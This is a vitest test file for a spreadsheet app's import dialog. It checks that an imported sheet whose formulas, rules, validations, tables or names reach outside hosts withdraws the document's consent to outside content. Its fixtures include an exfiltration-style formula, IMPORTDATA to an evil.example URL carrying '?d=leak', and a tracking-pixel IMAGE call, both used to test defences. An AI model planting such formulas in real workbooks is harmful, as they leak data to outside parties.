// @vitest-environment jsdom
import { afterEach, beforeEach, expect, it, vi } from 'vitest';
import { Workbook } from '../src/core/workbook.js';
import { Doc } from '../src/lib/doc.js';
import { parseRange } from '../src/core/cell.js';
import { importReachesOut, openImportPlacementDialog } from '../src/ui/importdialog.js';
import { closeAllModals } from '../src/ui/modal.js';
import { memoryStorage } from './helpers/memory-storage.js';

vi.mock('../src/ui/toast.js', () => ({ toast: vi.fn() }));

// Importing anything into an open document withdrew its consent to outside content, so a book
// whose own allowed IMPORTDATA cells were running showed #BLOCKED! in them after a plain CSV
// was appended, and the consent had to be given again. Only content that itself reaches out
// (a formula of the placed sheet, a rule, a validation, a table column, a filter condition or a
// name of the file) costs the document its consent; anything else leaves it as it was.
let doc;
beforeEach(() => {
  Object.defineProperty(globalThis, 'localStorage', { value: memoryStorage(), configurable: true });
  vi.useFakeTimers();
  vi.stubGlobal('matchMedia', () => ({ matches: true }));
  document.body.innerHTML = '<div id="app"></div>';
});
afterEach(() => { closeAllModals(); doc?.destroy(); doc = null; vi.clearAllTimers(); vi.useRealTimers(); vi.unstubAllGlobals(); document.body.replaceChildren(); });

function setUp() {
  doc = new Doc({ name: 'Mine' });
  const { wb } = doc;
  const id = wb.activeSheetId;
  wb.setAsyncProvider('IMPORTDATA', async () => [['fetched']]);
  wb.setInput(id, 0, 0, '=IMPORTDATA("https://example.com/a.csv")');
  doc.allowExternal();
  const distrust = vi.spyOn(doc, 'distrustExternal');
  const ctx = { wb, doc, sheetId: () => id, active: () => ({ r: 5, c: 0 }), grid: { focus() {} } };
  return { wb, id, ctx, distrust };
}
function submit(ctx, other, mode) {
  const modal = openImportPlacementDialog(ctx, other, 'theirs.csv');
  modal.panel.querySelector(`input[value="${mode}"]`).click();
  modal.panel.querySelector('form').dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
  return modal;
}

it.each(['cell', 'append', 'replace', 'sheets'])('keeps the document\'s consent when a plain file is placed in %s mode', async (mode) => {
  const { wb, id, ctx, distrust } = setUp();
  const other = new Workbook();
  other.setInput(other.activeSheetId, 0, 0, '5');
  submit(ctx, other, mode);
  expect(wb.externalAllowed).toBe(true);
  expect(distrust).not.toHaveBeenCalled();
  await vi.advanceTimersByTimeAsync(50);
  if (mode !== 'replace') expect(wb.getValue(id, 0, 0)).toBe('fetched');
});

it('still withdraws consent before placing a sheet whose formula reaches out', () => {
  const { wb, id, ctx, distrust } = setUp();
  const other = new Workbook();
  other.setInput(other.activeSheetId, 0, 0, '=IMPORTDATA("https://evil.example/?d=leak")');
  const seen = [];
  wb.addEventListener('change', () => { if (wb.getCell(id, 5, 0)?.f) seen.push(wb.externalAllowed); });
  submit(ctx, other, 'cell');
  expect(seen.length).toBeGreaterThan(0);
  expect(seen.every((allowed) => allowed === false)).toBe(true);
  expect(wb.externalAllowed).toBe(false);
  expect(distrust).toHaveBeenCalledTimes(1);
});

it('withdraws consent for a file whose other sheet reaches out only when that sheet comes along', () => {
  const { wb, ctx, distrust } = setUp();
  const other = new Workbook({ sheets: [{ name: 'Plain' }, { name: 'Fetching' }] });
  other.setInput(other.sheets[0].id, 0, 0, '5');
  other.setInput(other.sheets[1].id, 0, 0, '=IMAGE("https://evil.example/pixel.png")');
  submit(ctx, other, 'cell'); // the sheet picker defaults to Plain
  expect(wb.externalAllowed).toBe(true);
  expect(distrust).not.toHaveBeenCalled();
  submit(ctx, other, 'sheets');
  expect(wb.externalAllowed).toBe(false);
  expect(distrust).toHaveBeenCalledTimes(1);
});

it('sees a formula reaching out from a rule, a validation, a table column, a filter or a name', () => {
  const plain = new Workbook();
  plain.setInput(plain.activeSheetId, 0, 0, 'Amount');
  plain.setInput(plain.activeSheetId, 1, 0, '5');
  expect(importReachesOut(plain)).toBe(false);
  expect(importReachesOut(plain, plain.activeSheetId)).toBe(false);
  const through = (set) => { const wb = new Workbook(plain.toJSON()); set(wb, wb.activeSheetId); return importReachesOut(wb, wb.activeSheetId); };
  expect(through((wb, id) => wb.addRule(id, { range: parseRange('A2'), type: 'formula', value: '=IMPORTDATA("https://x.test")', style: {} }))).toBe(true);
  expect(through((wb, id) => wb.addValidation(id, { range: parseRange('A2'), type: 'formula', source: '=IMPORTXML("https://x.test","//a")' }))).toBe(true);
  expect(through((wb, id) => wb.addValidation(id, { range: parseRange('A2'), type: 'list', source: ['IMPORTDATA("https://x.test")'] }))).toBe(false);
  expect(through((wb, id) => { wb.addTable(id, parseRange('A1:B2'), { name: 'T' }); wb.setInput(id, 1, 1, '=IMPORTDATA("https://x.test")'); })).toBe(true);
  expect(through((wb) => wb.defineName('Fetch', 'IMPORTDATA("https://x.test")'))).toBe(true);
  expect(through((wb, id) => wb.setInput(id, 1, 0, '=IMAGE("data:image/png;base64,AAAA")'))).toBe(false);
});
